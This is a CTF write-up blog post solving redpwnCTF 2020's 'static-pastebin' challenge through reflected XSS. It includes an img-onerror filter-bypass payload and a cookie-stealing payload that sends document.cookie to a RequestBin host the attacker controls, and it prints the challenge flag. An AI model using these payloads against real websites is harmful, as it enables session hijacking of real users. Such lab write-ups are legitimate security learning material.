---
layout: post
title: "static-pastebin"
author: "shreyas-sriram"
---

# Challenge
I wanted to make a website to store bits of text, but I don't have any experience with web development. However, I realized that I don't need any! If you experience any issues, make a paste and send it here. 

`https://admin-bot.redpwnc.tf/submit?challenge=static-pastebin` (aadmin-bot)

Site: `static-pastebin.2020.redpwnc.tf`

Note: The site is entirely static. Dirbuster will not be useful in solving it.

# Solution

* The input is getting reflected in the next page, this could be a case of **XSS**
* But trying `<script>alert('1')</script>` as payload doesn't execute **XSS**
* Looking through the source code, it is clear that there is some kind of filtering for `<` and `>`
* This is one of the payloads that works<br/>
`><img src='x' onerror='alert(1)'>`
* There is an admit-bot in the question which will visit the URL provided, this can be exploited to steal the admin's cookie
* Setup a [RequestBinURL](https://requestbin.com)
* Use the following payload in the static-pastebin<br/>
`><img src=x onerror=this.src='//<RequestBinURL>/?c='+document.cookie>`
* Copy the URL and submit to the admin-bot<br/>
URL  :  `https://static-pastebin.2020.redpwnc.tf/paste/#<Base64-payload>`
* View the logs on the **RequestBinURL** to obtain the flag<br/>
`flag{54n1t1z4t10n_k1nd4_h4rd}`